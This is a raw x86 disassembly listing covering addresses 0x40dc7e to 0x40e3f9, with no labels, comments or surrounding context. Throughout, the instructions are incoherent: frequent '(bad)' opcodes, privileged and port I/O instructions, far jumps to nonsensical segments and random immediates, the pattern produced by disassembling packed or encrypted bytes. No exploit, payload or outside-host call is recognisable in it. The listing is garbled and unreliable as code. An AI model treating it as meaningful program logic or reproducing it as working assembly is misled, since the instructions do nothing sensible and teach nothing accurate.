  40dc7e:	lods   al,BYTE PTR ds:[esi]
  40dc7f:	sub    eax,DWORD PTR gs:[ebx]
  40dc82:	jne    0x40dca2
  40dc84:	mov    eax,ds:0x1a88608d
  40dc89:	pushf  
  40dc8a:	es es clc 
  40dc8d:	and    eax,0xeed390b
  40dc92:	inc    edi
  40dc93:	sub    ch,BYTE PTR [edx+0x78]
  40dc96:	jbe    0x40dcc7
  40dc98:	sbb    eax,0xa9df9d9a
  40dc9d:	push   cs
  40dc9e:	xchg   ebp,eax
  40dc9f:	lods   al,BYTE PTR ds:[esi]
  40dca0:	shr    DWORD PTR [edi],cl
  40dca2:	adc    BYTE PTR [esi],cl
  40dca4:	inc    edi
  40dca5:	int    0x80
  40dca7:	push   ebx
  40dca8:	mov    bl,0xf7
  40dcaa:	outs   dx,DWORD PTR ds:[esi]
  40dcab:	sub    eax,0xb701e813
  40dcb0:	or     al,al
  40dcb2:	sbb    dh,BYTE PTR [ecx+ebx*4+0x6bb0b38f]
  40dcb9:	and    DWORD PTR [edi+esi*4+0x74],esi
  40dcbd:	ret    0xa89
  40dcc0:	adc    BYTE PTR [esp+ecx*8],al
  40dcc3:	sbb    ebp,DWORD PTR [esi]
  40dcc5:	mov    ch,0x7e
  40dcc7:	sti    
  40dcc8:	scas   eax,DWORD PTR es:[edi]
  40dcc9:	cmp    eax,0x620eb26a
  40dcce:	mov    dh,0x2e
  40dcd0:	test   BYTE PTR [edi-0x46],dh
  40dcd3:	adc    esp,DWORD PTR [ecx]
  40dcd5:	aad    0x3
  40dcd7:	mov    bh,0x7d
  40dcd9:	div    BYTE PTR [ebx+0x9a123c8]
  40dcdf:	clc    
  40dce0:	xlat   BYTE PTR ds:[ebx]
  40dce1:	pop    ss
  40dce2:	fimul  WORD PTR fs:[edx-0x7b]
  40dce6:	push   esi
  40dce7:	adc    al,0x9b
  40dce9:	(bad)
  40dcec:	adc    al,0xa
  40dcee:	outs   dx,DWORD PTR ds:[esi]
  40dcef:	xlat   BYTE PTR ds:[ebx]
  40dcf0:	inc    esi
  40dcf1:	jecxz  0x40dd4c
  40dcf3:	loope  0x40dc81
  40dcf5:	add    al,0xf6
  40dcf7:	add    cl,BYTE PTR [ecx+esi*2+0x6b]
  40dcfb:	xchg   edx,eax
  40dcfc:	repnz and DWORD PTR [eax+0x36],edi
  40dd00:	stc    
  40dd01:	xchg   esi,eax
  40dd02:	cmp    eax,0x9414fc1d
  40dd07:	iret   
  40dd08:	mov    edx,0x36d430d8
  40dd0d:	dec    ebp
  40dd0e:	cmp    BYTE PTR [ebp-0x7379138f],ch
  40dd14:	add    DWORD PTR [ecx+0x49],0xffffffef
  40dd18:	adc    al,BYTE PTR [ebp+0x39]
  40dd1b:	in     al,dx
  40dd1c:	and    eax,0x9703e750
  40dd21:	jge    0x40dd5d
  40dd23:	xor    al,0x4a
  40dd25:	jp     0x40dd46
  40dd27:	inc    BYTE PTR [ecx-0x67]
  40dd2a:	psrad  mm6,QWORD PTR [ebx+eiz*1-0x24]
  40dd2f:	dec    eax
  40dd30:	pusha  
  40dd31:	and    al,0xa9
  40dd33:	ror    DWORD PTR [edi+eiz*8-0x47],0x9d
  40dd38:	xchg   DWORD PTR [ecx-0x37],edx
  40dd3b:	pop    ebx
  40dd3c:	push   ds
  40dd3d:	(bad)  
  40dd3e:	call   DWORD PTR [edi+0xd]
  40dd41:	and    eax,0x5800ac4b
  40dd46:	fldlg2 
  40dd48:	inc    esi
  40dd49:	and    dh,ah
  40dd4b:	add    bh,BYTE PTR [ebp+0x5940f48b]
  40dd51:	jmp    0x40dd88
  40dd53:	popa   
  40dd54:	mov    esp,0x4f093ec0
  40dd59:	mov    eax,ds:0x8f7a0fdc
  40dd5e:	and    edx,DWORD PTR [edx-0x630263ac]
  40dd64:	into   
  40dd65:	les    esi,FWORD PTR [ebx]
  40dd67:	lock pop ebp
  40dd69:	and    al,0xe5
  40dd6b:	scas   al,BYTE PTR es:[edi]
  40dd6c:	mov    al,0xfa
  40dd6e:	mov    BYTE PTR [esi-0x72a0f838],ch
  40dd74:	mov    DWORD PTR [esi+ebx*1],ebx
  40dd77:	dec    ebx
  40dd78:	(bad)  
  40dd7a:	and    eax,0x37acb3d8
  40dd7f:	sbb    dl,BYTE PTR [ebx-0x5bddaaba]
  40dd85:	pop    ecx
  40dd86:	aaa    
  40dd87:	test   DWORD PTR [edx+0x568d5f37],eax
  40dd8d:	fcom   DWORD PTR [eax+0xd56d28b]
  40dd93:	adc    bl,BYTE PTR [edx+0x30ca1848]
  40dd99:	cbw    
  40dd9b:	ds mov edx,0x575825e4
  40dda1:	cmp    DWORD PTR [edx-0x1],ecx
  40dda4:	scas   eax,DWORD PTR es:[edi]
  40dda5:	push   cs
  40dda6:	jp     0x40ddd0
  40dda8:	aas    
  40dda9:	ins    BYTE PTR es:[edi],dx
  40ddaa:	mov    bl,BYTE PTR [ecx-0xa]
  40ddad:	sbb    BYTE PTR [eax+0x5b],ch
  40ddb0:	(bad)  
  40ddb2:	test   ebx,ecx
  40ddb4:	jle    0x40dd8f
  40ddb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddb7:	in     eax,dx
  40ddb8:	ds aad 0x0
  40ddbb:	aad    0xd9
  40ddbd:	pop    esp
  40ddbe:	mov    ah,0xc0
  40ddc0:	adc    BYTE PTR [esi+esi*1],0x85
  40ddc4:	lods   al,BYTE PTR ds:[esi]
  40ddc5:	leave  
  40ddc6:	mov    al,0x37
  40ddc8:	outs   dx,DWORD PTR ds:[esi]
  40ddc9:	sbb    ebp,0xffffffe6
  40ddcc:	cdq    
  40ddcd:	sbb    ecx,edx
  40ddcf:	mov    ecx,0x14826fea
  40ddd4:	push   esp
  40ddd5:	jno    0x40de07
  40ddd7:	mov    ds:0x14c7d783,eax
  40dddc:	and    eax,0x37af393
  40dde1:	push   0xe7c32390
  40dde6:	pandn  mm1,QWORD PTR [esi-0x77]
  40ddea:	(bad)  
  40ddeb:	sub    DWORD PTR [edx+0x66],ecx
  40ddee:	sahf   
  40ddef:	mov    dl,0xe6
  40ddf1:	mov    eax,0xadf92795
  40ddf6:	add    DWORD PTR [eax-0x725dd7f4],eax
  40ddfc:	(bad)  
  40ddfd:	xor    al,0x10
  40ddff:	sbb    ecx,edi
  40de01:	fidiv  DWORD PTR [ecx-0x4c3aa8c2]
  40de07:	ror    cl,cl
  40de09:	mov    ah,0x53
  40de0b:	in     al,dx
  40de0c:	jecxz  0x40de53
  40de0e:	sahf   
  40de0f:	(bad)
  40de12:	xor    al,0xa1
  40de14:	js     0x40dd9e
  40de16:	dec    ebx
  40de17:	cmp    bl,0xbb
  40de1a:	xor    ch,BYTE PTR [ebx-0x13e9a22b]
  40de20:	push   eax
  40de21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de22:	xlat   BYTE PTR ds:[ebx]
  40de23:	mov    ds:0x538aaae7,eax
  40de28:	pop    eax
  40de29:	pop    esi
  40de2a:	popf   
  40de2b:	adc    eax,0xa40b9e54
  40de30:	jge    0x40de45
  40de32:	bound  ebp,QWORD PTR [esi-0x69]
  40de35:	popa   
  40de36:	aad    0x2e
  40de38:	mov    al,ds:0xab673288
  40de3d:	jmp    0x8147:0x42e6f742
  40de44:	in     al,dx
  40de45:	rcr    DWORD PTR [esi],1
  40de47:	in     eax,dx
  40de48:	push   eax
  40de49:	xchg   ecx,eax
  40de4a:	shr    DWORD PTR [ebp+ebx*8-0x5dd90ddc],1
  40de51:	jge    0x40de6c
  40de53:	and    DWORD PTR [esi],ebx
  40de55:	inc    esi
  40de56:	ins    BYTE PTR es:[edi],dx
  40de57:	dec    esp
  40de58:	test   BYTE PTR [ebx],dh
  40de5a:	sub    ah,BYTE PTR [eax+0x2]
  40de5d:	fist   WORD PTR [eax-0x45]
  40de60:	xchg   BYTE PTR [edx],bh
  40de62:	push   0x4b
  40de64:	mov    al,ds:0x95a28cb1
  40de69:	cmp    ebx,DWORD PTR [edx+eax*4-0x23e9480e]
  40de70:	cdq    
  40de71:	and    BYTE PTR [ebp-0x1d],bl
  40de74:	jg     0x40de0e
  40de76:	enter  0x8c51,0x5e
  40de7a:	imul   edi
  40de7c:	rol    DWORD PTR [esi+eax*1+0x63],0x7
  40de81:	test   al,0x97
  40de83:	jge    0x40de28
  40de85:	cs into 
  40de87:	inc    esi
  40de88:	mov    al,0xb7
  40de8a:	fild   WORD PTR [edi+0xb30c122]
  40de90:	clc    
  40de91:	repnz dec edx
  40de93:	scas   al,BYTE PTR es:[edi]
  40de94:	xor    edx,0x196c38d2
  40de9a:	mov    ch,0x68
  40de9c:	adc    dl,0x21
  40de9f:	or     BYTE PTR [ebx+0x5],dl
  40dea2:	add    eax,0xd1c1fb99
  40dea7:	mov    ds:0xab477f5c,eax
  40deac:	mov    ds:0xbe4be30,al
  40deb1:	and    DWORD PTR [bp-0x1b],0xe748f43c
  40deb9:	jne    0x40df01
  40debb:	dec    edi
  40debc:	into   
  40debd:	(bad)
  40dec2:	cmp    edi,DWORD PTR [edx+0x5]
  40dec5:	outs   dx,BYTE PTR ds:[esi]
  40dec6:	jmp    0x40de58
  40dec8:	cmp    DWORD PTR [edx],esp
  40deca:	fmul   DWORD PTR [edi]
  40decc:	sahf   
  40decd:	fsub   st,st(7)
  40decf:	sbb    cl,BYTE PTR [ebp+0x14eb5200]
  40ded5:	shl    ebp,1
  40ded7:	push   edx
  40ded8:	adc    BYTE PTR [edi+0x30],dl
  40dedb:	dec    edi
  40dedc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dedd:	fild   DWORD PTR [edx-0x54]
  40dee0:	fs sub edi,ebx
  40dee3:	mov    edx,DWORD PTR [esi+0x3c]
  40dee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee7:	(bad)  
  40dee8:	push   ds
  40dee9:	sub    eax,0x80da68d
  40deee:	xchg   esi,eax
  40deef:	dec    edx
  40def0:	sbb    BYTE PTR [ebp+0x4c5beff1],al
  40def6:	inc    ecx
  40def7:	inc    edi
  40def8:	lea    ebp,[ecx+0x40]
  40defb:	push   ecx
  40defc:	mov    ebp,0x293166e5
  40df01:	xor    eax,0xeb30d9d1
  40df06:	test   al,0x16
  40df08:	push   esp
  40df09:	xchg   bp,ax
  40df0b:	sub    al,0xa9
  40df0d:	fiadd  DWORD PTR [edx+0x5324d272]
  40df13:	add    edi,DWORD PTR [edx]
  40df15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df16:	gs pushf 
  40df18:	push   es
  40df19:	push   esi
  40df1a:	mov    DWORD PTR [eax+0x2c],ecx
  40df1d:	mov    dh,BYTE PTR [bp+di-0xbba]
  40df22:	popf   
  40df23:	(bad)
  40df28:	(bad)  
  40df2a:	test   eax,0x81586fed
  40df2f:	into   
  40df30:	add    DWORD PTR es:[edi+edi*4+0x43],esi
  40df35:	sbb    DWORD PTR [edi-0x7bb4ab2b],0xf41088b6
  40df3f:	cmp    DWORD PTR [ebp-0x2a],ebp
  40df42:	int    0xd
  40df44:	inc    edx
  40df45:	retf   0x736
  40df48:	push   ecx
  40df49:	repnz mov edi,cs
  40df4c:	test   al,0x1c
  40df4e:	popa   
  40df4f:	and    ebx,0x43
  40df52:	jns    0x40def9
  40df54:	pop    ss
  40df55:	adc    esi,ebp
  40df57:	test   DWORD PTR [esi+0x20],edi
  40df5a:	ret    
  40df5b:	dec    edx
  40df5c:	inc    ecx
  40df5d:	or     al,0xae
  40df5f:	test   BYTE PTR [ecx+edx*8],ch
  40df62:	push   ss
  40df63:	fcomp  QWORD PTR [eax-0x31]
  40df66:	mov    ds:0x5f995f20,ax
  40df6c:	push   ds
  40df6d:	inc    edi
  40df6e:	jmp    0x92af2ae6
  40df73:	jbe    0x40df5b
  40df75:	pop    edi
  40df76:	jae    0x40df0a
  40df78:	and    dh,BYTE PTR [edi+0x4da412c2]
  40df7e:	sub    ecx,DWORD PTR [ebp-0x57675976]
  40df84:	sub    BYTE PTR [ebp+0x2c],ch
  40df87:	jecxz  0x40dfb1
  40df89:	sbb    BYTE PTR [ebp-0x13b147a6],bl
  40df8f:	jge    0x40df87
  40df91:	and    bh,BYTE PTR [esi]
  40df93:	cmp    BYTE PTR [eax-0x10a54d35],bh
  40df99:	pextrw eax,mm4,0x11
  40df9d:	push   ebx
  40df9e:	jmp    0xf513:0xe71d13ea
  40dfa5:	into   
  40dfa6:	xchg   edi,eax
  40dfa7:	pop    esi
  40dfa8:	repnz test DWORD PTR [esi+0x27],ebp
  40dfac:	mov    edi,0x66e34ea8
  40dfb1:	or     al,0x4b
  40dfb3:	lds    eax,FWORD PTR [ebx-0x15]
  40dfb6:	push   esp
  40dfb7:	jo     0x40df9c
  40dfb9:	lds    eax,FWORD PTR [esi+0x4d494ef0]
  40dfbf:	dec    ebp
  40dfc0:	sbb    dl,bl
  40dfc2:	cdq    
  40dfc3:	adc    esi,ecx
  40dfc5:	jmp    0x40e020
  40dfc7:	cwde   
  40dfc8:	xor    DWORD PTR [esi+0x11],edx
  40dfcb:	mov    dh,0xe1
  40dfcd:	or     edi,eax
  40dfcf:	mov    DWORD PTR [esp+ebp*4],edi
  40dfd2:	mov    ebx,0x9001ce99
  40dfd7:	inc    eax
  40dfd8:	jbe    0x40dfbd
  40dfda:	scas   al,BYTE PTR es:[edi]
  40dfdb:	cmc    
  40dfdc:	mov    edx,0x7c0ca00b
  40dfe1:	and    DWORD PTR [ebx-0x4d],ecx
  40dfe4:	(bad)  
  40dfe5:	push   esi
  40dfe6:	mov    al,0xd8
  40dfe8:	std    
  40dfe9:	pop    es
  40dfea:	xchg   ebx,eax
  40dfeb:	add    bh,BYTE PTR [ebp-0x7b544ca1]
  40dff1:	pop    esp
  40dff2:	jmp    0xef78:0xace58c1a
  40dff9:	sub    esi,DWORD PTR [edi-0x6ccb39e]
  40dfff:	jno    0x40dfa1
  40e001:	and    DWORD PTR [eax],ecx
  40e003:	and    DWORD PTR [eax+0x32643301],eax
  40e009:	lds    eax,FWORD PTR ds:0x11fbbf3c
  40e00f:	xor    cl,BYTE PTR [edx+0x3d8fdd4e]
  40e015:	push   ds
  40e016:	xchg   ebx,eax
  40e017:	mov    edi,0xf8695a2a
  40e01c:	xor    BYTE PTR [edx+0x30],bh
  40e01f:	inc    edx
  40e020:	jne    0x40e021
  40e022:	loop   0x40e014
  40e024:	push   es
  40e025:	lahf   
  40e026:	pop    eax
  40e027:	scas   al,BYTE PTR es:[edi]
  40e028:	outs   dx,BYTE PTR ds:[esi]
  40e029:	jo     0x40dfe2
  40e02b:	dec    ecx
  40e02c:	cs aas 
  40e02e:	cmp    eax,0x36ed9cfe
  40e033:	xchg   esi,eax
  40e034:	shl    ecx,cl
  40e036:	xchg   edi,eax
  40e037:	sbb    BYTE PTR [edi],dl
  40e039:	bound  ebp,QWORD PTR [edx+0x1dcdceb1]
  40e03f:	dec    ebp
  40e040:	fcmovnbe st,st(7)
  40e042:	mov    ds:0x8775effc,eax
  40e047:	rol    DWORD PTR [ecx-0x7ae7f6eb],0x38
  40e04e:	push   ebx
  40e04f:	or     al,0xc7
  40e051:	inc    ebx
  40e052:	scas   eax,DWORD PTR es:[edi]
  40e053:	mov    dl,0x68
  40e055:	inc    esi
  40e056:	pop    esi
  40e057:	cli    
  40e058:	cwde   
  40e059:	xchg   cl,dh
  40e05b:	mov    ebp,0x40edbcb8
  40e060:	inc    esi
  40e061:	inc    esp
  40e062:	add    eax,0x170bf28e
  40e067:	xor    ecx,edx
  40e069:	or     eax,0x1842639c
  40e06e:	jno    0x40e0c0
  40e070:	or     al,0x83
  40e072:	leave  
  40e073:	ja     0x40e017
  40e075:	cmp    al,0xc7
  40e077:	xor    ecx,DWORD PTR [ebp+0x5a526dcd]
  40e07d:	xor    eax,0xba22898f
  40e082:	dec    eax
  40e083:	shl    BYTE PTR [ecx*8-0x56e9e8f1],0xab
  40e08b:	imul   ebx
  40e08d:	jbe    0x40e03f
  40e08f:	sub    BYTE PTR [edi-0x5a],bh
  40e092:	mov    bl,0x87
  40e094:	mov    ah,0x2a
  40e096:	ins    BYTE PTR es:[edi],dx
  40e097:	mov    esp,0xac0610cd
  40e09c:	mov    edi,0xc874bcfc
  40e0a1:	(bad)  
  40e0a3:	or     bl,dl
  40e0a5:	nop
  40e0a6:	mov    cl,0xd2
  40e0a8:	cmp    eax,0x8f8a98a4
  40e0ad:	cmp    BYTE PTR [edx+0x4100dd40],0x1e
  40e0b4:	clc    
  40e0b5:	add    al,0x87
  40e0b7:	xor    BYTE PTR [edx],cl
  40e0b9:	test   BYTE PTR [edx],ch
  40e0bb:	dec    esp
  40e0bc:	mov    ecx,0xf7c5c2f3
  40e0c1:	das    
  40e0c2:	sub    ah,bl
  40e0c4:	call   0xf99d1b9a
  40e0c9:	fwait
  40e0ca:	lds    esi,FWORD PTR [eax-0x16]
  40e0cd:	loop   0x40e08f
  40e0cf:	ret    
  40e0d0:	cli    
  40e0d1:	or     ch,BYTE PTR [ebp+0x3443eb71]
  40e0d7:	jl     0x40e121
  40e0d9:	out    dx,al
  40e0da:	scas   al,BYTE PTR es:[edi]
  40e0db:	and    eax,0xc7d358b9
  40e0e0:	and    esp,DWORD PTR [ebx]
  40e0e2:	ror    DWORD PTR [ecx-0x46],1
  40e0e5:	stos   BYTE PTR es:[edi],al
  40e0e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0e7:	dec    edi
  40e0e8:	sub    BYTE PTR [edi-0x7b8ec0f3],dh
  40e0ee:	lods   eax,DWORD PTR ds:[esi]
  40e0ef:	push   esi
  40e0f0:	je     0x40e0a7
  40e0f2:	cmp    al,0x0
  40e0f4:	imul   ebx,DWORD PTR [edx-0xb8e14bd],0xffffff87
  40e0fb:	and    ecx,DWORD PTR [edi-0x4f502c80]
  40e101:	jl     0x40e0ca
  40e103:	xor    DWORD PTR [edx+0x6e],ebx
  40e106:	sbb    dl,BYTE PTR [edi]
  40e108:	mov    ds:0xa7202c24,al
  40e10d:	bound  esp,QWORD PTR [ebx]
  40e10f:	add    eax,0x36f3dde1
  40e114:	sub    eax,0xbb504a0d
  40e119:	pop    ds
  40e11a:	test   al,0x48
  40e11c:	stos   DWORD PTR es:[edi],eax
  40e11d:	hlt    
  40e11e:	pop    ecx
  40e11f:	fmul   QWORD PTR [ecx]
  40e121:	rcl    BYTE PTR [ebx],0x68
  40e124:	and    ecx,esi
  40e126:	shl    DWORD PTR [edi-0x3e],1
  40e129:	jg     0x40e149
  40e12b:	and    al,0x53
  40e12d:	sub    BYTE PTR [esi+0x77a6c10a],al
  40e133:	dec    eax
  40e134:	dec    edi
  40e135:	ret    
  40e136:	int3   
  40e137:	fldenv [edx-0x3d]
  40e13a:	dec    esi
  40e13b:	cmp    BYTE PTR [esi+0x4588e431],cl
  40e141:	xchg   edi,eax
  40e142:	popf   
  40e143:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40e145:	call   0x2de4:0x60979432
  40e14c:	and    edi,ebp
  40e14e:	push   edx
  40e14f:	dec    ebx
  40e150:	shl    DWORD PTR [edi-0x3a],0xad
  40e154:	push   cs
  40e155:	cwde   
  40e156:	aaa    
  40e157:	icebp  
  40e158:	fcmovu st,st(6)
  40e15a:	xchg   ecx,eax
  40e15b:	mov    bl,0x15
  40e15d:	and    eax,0x7ac65100
  40e162:	xchg   ecx,eax
  40e163:	push   ebp
  40e164:	push   ebp
  40e165:	fs mov esp,0x8d204db4
  40e16b:	xor    eax,0x88a50517
  40e170:	xchg   edi,eax
  40e171:	leave  
  40e172:	push   esi
  40e173:	popa   
  40e174:	aam    0x21
  40e176:	inc    eax
  40e177:	popf   
  40e178:	adc    al,0x61
  40e17a:	pop    esi
  40e17b:	ja     0x40e149
  40e17d:	inc    edi
  40e17e:	in     eax,dx
  40e17f:	out    dx,al
  40e180:	pop    ss
  40e181:	test   DWORD PTR ds:0x2dfb5477,0x2cab11f8
  40e18b:	cli    
  40e18c:	pop    es
  40e18d:	mov    cl,0xeb
  40e18f:	loopne 0x40e12f
  40e191:	xchg   ecx,eax
  40e192:	jecxz  0x40e119
  40e194:	mov    cl,0x5b
  40e196:	adc    DWORD PTR [eax+0x64],edi
  40e199:	jb     0x40e176
  40e19b:	ins    BYTE PTR es:[edi],dx
  40e19c:	dec    eax
  40e19d:	push   esi
  40e19e:	in     eax,0x9e
  40e1a0:	sub    DWORD PTR [ecx+0x14],esi
  40e1a3:	addr16 pop eax
  40e1a5:	mov    ds:0x70aa7721,al
  40e1aa:	lahf   
  40e1ab:	or     ebx,eax
  40e1ad:	pop    es
  40e1ae:	jo     0x40e1eb
  40e1b0:	retf   0x6763
  40e1b3:	stos   BYTE PTR es:[edi],al
  40e1b4:	wbinvd 
  40e1b6:	in     eax,dx
  40e1b7:	test   DWORD PTR [ecx+ebx*4],0xb57f0e24
  40e1be:	ss sub eax,0xc5ac70cb
  40e1c4:	jg     0x40e1c6
  40e1c6:	adc    bl,bl
  40e1c8:	xor    BYTE PTR [eax-0x212043f0],cl
  40e1ce:	pop    esi
  40e1cf:	lock ins DWORD PTR es:[edi],dx
  40e1d1:	mov    esp,0x23b7a08d
  40e1d6:	mov    dh,0x65
  40e1d8:	addr16 jb 0x40e160
  40e1db:	out    0x70,al
  40e1dd:	fiadd  WORD PTR [edi+0xb13a28a]
  40e1e3:	mov    ebp,0x420891e1
  40e1e8:	xchg   ebp,eax
  40e1e9:	scas   al,BYTE PTR es:[edi]
  40e1ea:	sbb    BYTE PTR [edi],dh
  40e1ec:	seto   BYTE PTR [edi+0x18566d55]
  40e1f3:	aad    0xd0
  40e1f5:	(bad)  
  40e1f6:	ret    
  40e1f7:	cmp    al,0xe2
  40e1f9:	nop
  40e1fa:	clc    
  40e1fb:	xchg   ebp,eax
  40e1fc:	jbe    0x40e206
  40e1fe:	call   FWORD PTR [edx-0x19]
  40e201:	out    dx,eax
  40e202:	mov    DWORD PTR [esp+ecx*8+0x3fd86b27],edi
  40e209:	dec    esp
  40e20a:	jg     0x40e18e
  40e20c:	mov    dh,0xa
  40e20e:	shl    DWORD PTR [eax-0x4c],1
  40e211:	add    edi,0x4f1393fe
  40e217:	xlat   BYTE PTR ds:[ebx]
  40e218:	sub    eax,0xe8e50a13
  40e21d:	je     0x40e262
  40e21f:	xor    eax,0xeafa208b
  40e224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e225:	sbb    eax,0x638556fe
  40e22a:	sti    
  40e22b:	xor    eax,0xd8de0094
  40e230:	cmp    BYTE PTR ds:0xca821f71,dl
  40e236:	push   0x8c90799e
  40e23b:	jl     0x40e2ad
  40e23d:	add    al,0xc4
  40e23f:	mov    WORD PTR [edx+0x23],ss
  40e242:	les    esp,FWORD PTR [edi]
  40e244:	call   0x6a9f:0xf3efb9bb
  40e24b:	pop    ss
  40e24c:	dec    edx
  40e24d:	rcl    BYTE PTR [ecx-0x19],cl
  40e250:	jmp    0x4795fdd1
  40e255:	mov    edx,0xa35a73c8
  40e25a:	inc    esi
  40e25b:	(bad)  [edx]
  40e25d:	(bad)  [edx-0x80]
  40e260:	je     0x40e216
  40e262:	ror    BYTE PTR [ebx+0x7e],0x64
  40e266:	inc    edi
  40e267:	cmp    eax,0xdc8dfad2
  40e26c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e26d:	loope  0x40e2b3
  40e26f:	or     al,BYTE PTR cs:[edx-0x6606b7c3]
  40e276:	cmc    
  40e277:	mov    ds:0xa8cd683d,eax
  40e27c:	jle    0x40e26a
  40e27e:	mov    ebx,0x605c28a1
  40e283:	int3   
  40e284:	test   eax,0xa824b6fc
  40e289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e28a:	dec    eax
  40e28b:	jb     0x40e2aa
  40e28d:	gs jbe 0x40e2a0
  40e290:	mov    esi,0x8c65f518
  40e295:	jl     0x40e24b
  40e297:	pop    ds
  40e298:	sbb    eax,DWORD PTR [esp+edx*4]
  40e29b:	xlat   BYTE PTR ds:[ebx]
  40e29c:	ja     0x40e2d0
  40e29e:	dec    ebx
  40e29f:	adc    ecx,DWORD PTR [edx-0x1a]
  40e2a2:	sbb    eax,0xf482acea
  40e2a7:	mov    ds:0x7a37f98b,eax
  40e2ac:	xchg   esi,eax
  40e2ad:	mov    ah,0x50
  40e2af:	ret    0x51c8
  40e2b2:	cmp    eax,0x536a1b2d
  40e2b7:	aaa    
  40e2b8:	mov    esi,ebx
  40e2ba:	jp     0x40e301
  40e2bc:	in     al,dx
  40e2bd:	push   edi
  40e2be:	das    
  40e2bf:	stos   DWORD PTR es:[edi],eax
  40e2c0:	retf   
  40e2c1:	repnz loopne 0x40e31e
  40e2c4:	fwait
  40e2c5:	jbe    0x64f4ddd
  40e2cb:	(bad)  
  40e2cc:	cmp    eax,DWORD PTR [ebp+ebx*8+0x1e5f27dc]
  40e2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d4:	sbb    BYTE PTR [edi+edi*2+0x761c50fa],cl
  40e2db:	jmp    FWORD PTR [edi+ebx*8+0x2b]
  40e2df:	enter  0xf15d,0x51
  40e2e3:	outs   dx,BYTE PTR ds:[esi]
  40e2e4:	es jp  0x40e270
  40e2e7:	add    al,0xd
  40e2e9:	inc    esi
  40e2ea:	out    dx,eax
  40e2eb:	push   0xffffffb9
  40e2ed:	add    al,BYTE PTR [ebp+0x6c7aa68c]
  40e2f3:	in     eax,0xc5
  40e2f5:	mov    ebp,0xb519af6d
  40e2fa:	jns    0x40e334
  40e2fc:	aad    0xac
  40e2fe:	jl     0x40e2d7
  40e300:	sub    BYTE PTR [ecx-0x18],0x8
  40e304:	xchg   esp,eax
  40e305:	fidiv  WORD PTR [ebp-0x29]
  40e308:	scas   al,BYTE PTR es:[edi]
  40e309:	adc    ecx,DWORD PTR [ecx+0x56]
  40e30c:	popf   
  40e30d:	pushf  
  40e30e:	or     BYTE PTR [ebx+0x49],cl
  40e311:	or     BYTE PTR [edi+0x59],ch
  40e314:	fadd   st,st(7)
  40e316:	nop
  40e317:	inc    ebp
  40e318:	mov    edx,0x351bcf91
  40e31d:	out    dx,eax
  40e31e:	enter  0x4e3f,0xb7
  40e322:	add    BYTE PTR [eax],al
  40e324:	inc    edx
  40e325:	pop    ebp
  40e326:	xadd   DWORD PTR [edx-0x6d],edx
  40e32a:	shl    DWORD PTR [edx-0x7f],0xda
  40e32e:	jb     0x40e34e
  40e330:	mov    ch,dh
  40e332:	(bad)  [ecx-0x2e]
  40e335:	jl     0x40e352
  40e337:	push   ebp
  40e338:	sbb    edi,DWORD PTR [esp+esi*4]
  40e33b:	shl    DWORD PTR [ebx+0x16],1
  40e33e:	sahf   
  40e33f:	retf   0x4d8f
  40e342:	pop    ecx
  40e343:	dec    edi
  40e344:	lods   al,BYTE PTR ds:[esi]
  40e345:	dec    edx
  40e346:	out    0x50,eax
  40e348:	dec    esp
  40e349:	jmp    0xed8ddb49
  40e34e:	popf   
  40e34f:	sub    al,ch
  40e351:	imul   esp,DWORD PTR [ecx],0xf6df0ef7
  40e357:	shr    ah,0x15
  40e35a:	xchg   esp,eax
  40e35b:	inc    ecx
  40e35c:	es adc cl,bh
  40e35f:	push   es
  40e360:	pop    esp
  40e361:	xor    BYTE PTR [ebx+0x26],al
  40e364:	nop
  40e365:	inc    eax
  40e366:	js     0x40e381
  40e368:	ins    DWORD PTR es:[edi],dx
  40e369:	aaa    
  40e36a:	ins    BYTE PTR es:[edi],dx
  40e36b:	jmp    DWORD PTR [esi]
  40e36d:	add    al,0xc3
  40e36f:	xchg   ecx,eax
  40e370:	out    0x8a,eax
  40e372:	icebp  
  40e373:	jmp    0x1e49:0x6492ffbe
  40e37a:	pop    es
  40e37b:	mov    edx,0x824b0e49
  40e380:	in     eax,dx
  40e381:	imul   edi,DWORD PTR [ebp-0x43],0x1f
  40e385:	and    al,0x8
  40e387:	das    
  40e388:	jecxz  0x40e3ba
  40e38a:	xlat   BYTE PTR ds:[ebx]
  40e38b:	sbb    al,0xa9
  40e38d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e38f:	rol    DWORD PTR [eax],cl
  40e391:	push   ecx
  40e392:	stos   DWORD PTR es:[edi],eax
  40e393:	mov    eax,0x4bd5127a
  40e398:	sub    eax,0x1d21c8a
  40e39d:	stos   DWORD PTR es:[edi],eax
  40e39e:	mov    DWORD PTR [eax+0x1dbd92ad],ebx
  40e3a4:	xor    DWORD PTR [edx-0x14a49252],0x6ce247b3
  40e3ae:	sbb    al,cl
  40e3b0:	xor    al,0x9c
  40e3b2:	popa   
  40e3b3:	adc    al,0x1d
  40e3b5:	retf   0xfea2
  40e3b8:	push   eax
  40e3b9:	pop    ebp
  40e3ba:	and    esi,DWORD PTR ds:0xc32d0d8a
  40e3c0:	imul   BYTE PTR [ebx+0x49688841]
  40e3c6:	mov    cl,0xc8
  40e3c8:	cld    
  40e3c9:	cmp    ebx,DWORD PTR [ebx]
  40e3cb:	call   0x9062d9b2
  40e3d0:	loopne 0x40e372
  40e3d2:	ds or  edi,edx
  40e3d5:	or     ah,BYTE PTR [esi]
  40e3d7:	fadd   QWORD PTR [ecx+0x22]
  40e3da:	push   esp
  40e3db:	pop    ebx
  40e3dc:	cmp    ah,dl
  40e3de:	mov    eax,0xaf8cd8dc
  40e3e3:	cmp    al,0xc7
  40e3e5:	pop    ebp
  40e3e6:	test   esp,0xdcd6e034
  40e3ec:	xchg   ecx,eax
  40e3ed:	aaa    
  40e3ee:	and    al,0xbc
  40e3f0:	sub    BYTE PTR [esi+0x33],0x55
  40e3f4:	test   eax,0xb72d9214
  40e3f9:	lea    ebp,[ecx+0x2c8b25f3]
